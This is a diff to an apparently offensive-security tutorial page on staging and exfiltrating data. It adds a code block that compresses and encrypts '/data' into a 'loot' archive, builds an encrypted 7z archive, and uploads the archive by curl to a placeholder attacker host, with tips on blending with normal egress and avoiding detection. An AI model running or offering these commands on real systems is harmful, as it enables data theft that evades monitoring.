@@ -97,6 +97,13 @@
           <li><strong>Stage it</strong> &mdash; collect to a single working location, then compress and often encrypt into an archive so the transfer is one object you control.</li>
           <li><strong>Mind the footprint</strong> &mdash; mass file access and large archive creation are themselves detectable; scope tightly rather than hoovering everything.</li>
         </ul>
+        <pre><code># stage: collect to one place, then compress+encrypt into a single object
+tar czf - /data 2>/dev/null | openssl enc -aes-256-cbc -pbkdf2 -out loot.tar.gz.enc
+7z a -p&lt;pass&gt; -mhe=on loot.7z C:\stage\                 # Windows, header-encrypted
+
+# exfiltrate over an allowed channel (blend with normal egress)
+curl -s -F "f=@loot.tar.gz.enc" https://&lt;your-host&gt;/u    # HTTPS POST
+# DNS tunnelling (slow, but often permitted) and cloud-storage uploads are alternatives</code></pre>
 
         <h2>Exfiltration channels</h2>
         <table>
